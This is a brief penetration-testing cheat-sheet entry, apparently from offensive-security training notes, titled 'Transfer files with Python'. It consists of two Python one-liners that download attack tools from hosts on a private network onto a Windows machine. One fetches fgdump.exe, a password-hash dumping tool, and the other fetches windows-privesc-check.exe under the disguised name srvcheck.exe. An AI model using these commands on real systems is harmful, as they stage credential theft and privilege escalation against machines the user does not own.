# Transfer files with Python
python.exe -c "import urllib2; print urllib2.urlopen('http://192.168.56.1/fgdump.exe').read()" > fgdump.exe

python.exe -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.244:81/tools/WHP-master/windows-privesc-check.exe', 'srvcheck.exe')"
